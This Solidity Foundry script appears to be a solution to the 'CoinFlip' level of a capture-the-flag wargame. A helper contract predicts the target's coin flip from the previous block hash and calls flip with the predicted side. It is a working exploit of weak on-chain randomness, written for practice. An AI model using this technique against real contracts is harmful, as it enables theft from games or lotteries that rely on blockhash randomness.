// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../src/level3CoinFlip.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract Player {
    uint256 constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(CoinFlip _coinFlipInstance) {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        _coinFlipInstance.flip(side);
    }
}

contract CoinFlipSolution is Script {
    CoinFlip public coinflipInstance = CoinFlip(0x44C5d52a4cB4F1F93d852BF29D54099516D3BcdB);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        new Player(coinflipInstance);
        console.log("consecutiveWins: ", coinflipInstance.consecutiveWins());
        vm.stopBroadcast();
    }
}
